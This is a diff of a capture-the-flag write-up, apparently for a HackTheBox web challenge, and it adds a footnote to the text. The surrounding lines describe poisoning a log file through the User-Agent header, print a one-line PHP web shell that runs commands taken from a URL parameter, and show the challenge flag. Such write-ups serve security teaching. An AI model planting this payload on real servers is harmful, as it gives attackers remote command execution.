@@ -100,7 +100,7 @@ The cookie's value is replaced using the Firefox developer tools and the website
    <img src="includes/toxic-02.png" />
 </p>
 
-Now we need a way of injecting our PHP code into the log file. Since we can see that the log file contains the `User-Agent` string of all received HTTP requests, we decide to use this field for the injection. As payload we choose the following line:
+Now we need a way of injecting our PHP code into the log file. Since we can see that the log file contains the `User-Agent` string of all received HTTP requests, we decide to use this field for the injection. As payload we choose the following line[^7]:
 
 ``` php
 <?php echo shell_exec($_GET['cmd']); ?>
@@ -138,3 +138,5 @@ HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}
 [^4]: https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a
 [^5]: https://www.webmaster-tipps.de/php-sicherheit-local-file-inclusion-und-remote-file-inclusion/
 [^6]: https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
+[^7]: http://web.archive.org/web/20130809032648/http://chipmunkninja.com/Program-Execution-in-PHP%3A-exec-m@
+
